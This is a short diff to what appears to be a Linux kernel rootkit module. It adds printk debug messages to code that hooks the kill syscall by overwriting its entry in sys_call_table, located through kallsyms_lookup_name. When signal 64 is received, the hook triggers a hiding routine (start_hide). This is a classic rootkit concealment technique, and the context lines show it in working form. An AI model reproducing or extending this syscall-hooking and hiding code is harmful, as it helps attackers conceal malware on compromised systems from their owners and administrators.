@@ -21,6 +21,7 @@ void stop_hide(void){
 }
 
 asmlinkage long hook_kill(pid_t pid, int sig){
+    printk(KERN_INFO "kill hook in action\n");
     if (sig == 64 && !hide){
         start_hide();
         hide = 1;
@@ -34,6 +35,7 @@ asmlinkage long hook_kill(pid_t pid, int sig){
 
 
 void init_kill_hook(void){
+    printk(KERN_INFO "hooking on kill\n");
     uint64_t ** syscall_table = (uint64_t **) kallsyms_lookup_name("sys_call_table");
     syscall_table_kill = (uint64_t **) (&syscall_table[__NR_kill]);
     orig_kill = (sys_kill_t)*syscall_table_kill; 
